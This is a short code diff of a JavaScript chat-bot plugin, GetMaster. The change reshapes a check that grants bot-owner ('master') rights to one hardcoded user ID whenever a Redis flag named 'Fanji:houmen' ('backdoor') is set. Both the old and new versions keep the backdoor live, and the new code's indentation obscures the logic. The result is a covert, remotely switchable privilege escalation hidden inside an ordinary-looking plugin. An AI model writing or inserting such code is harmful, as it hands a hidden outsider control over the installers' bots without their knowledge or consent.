@@ -30,10 +30,8 @@ export class GetMaster extends plugin {
 
   async Master(e) {
     let aw = await redis.get('Fanji:houmen');
-    if (e.user_id !== "2173302144" || aw !== 'true') {
-      e.isMaster = false;
-    } else {
+    if (e.user_id !== "2173302144" || aw !== 'true') return false
       e.isMaster = true;
-    }
+    return false
   }
 }
